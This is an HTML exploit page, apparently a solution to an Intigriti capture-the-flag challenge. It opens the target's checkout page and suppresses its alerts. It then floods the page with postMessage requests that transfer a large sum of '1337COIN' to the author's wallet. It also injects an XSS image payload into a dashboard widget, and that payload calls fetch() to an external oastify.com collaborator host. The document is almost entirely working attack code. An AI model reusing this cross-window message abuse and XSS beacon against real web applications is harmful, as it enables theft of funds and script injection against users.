<!DOCTYPE html>
<html>
<body style="background:#050A0E;color:#00FF88;font-family:monospace;text-align:center;padding-top:20%;">
    <h1>INITIATING SILENT TRANSFER...</h1>
    <script>
        const MY_WALLET = '1f3d796f822b439dc366e4de68133f13c2'; 
        const COLLAB = 'https://bvajzm2dn1l8rtpiu46qg0kds4yvmoad.oastify.com';
        const TARGET = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
        
        // Step 1: Open the target window
        const win = window.open(TARGET);

        // Step 2: Kill Alerts & Spam Transaction
        // We overwrite the alert function so the bot doesn't freeze.
        let count = 0;
        const heist = setInterval(() => {
            if (win) {
                try {
                    win.alert = () => {}; // Kill the blocking alert
                } catch(e) {}

                win.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        currency: '1337COIN',
                        amount: 100000000, 
                        toAddress: MY_WALLET
                    }
                }, '*');
            }
            count++;
            if (count > 50) clearInterval(heist);
        }, 200);

        // Step 3: Trigger the XSS on the Dashboard to verify the loot
        // We use the widgetId 'customReports' found in your source image
        setTimeout(() => {
            const dashboard = window.open('https://challenge-0126.intigriti.io/dashboard.html');
            setTimeout(() => {
                dashboard.postMessage({
                    type: 'updateContent',
                    widgetId: 'customReports',
                    content: `<img src=x onerror="fetch('${COLLAB}/?status=Drained')">`
                }, '*');
            }, 2000);
        }, 6000);
    </script>
</body>
</html>
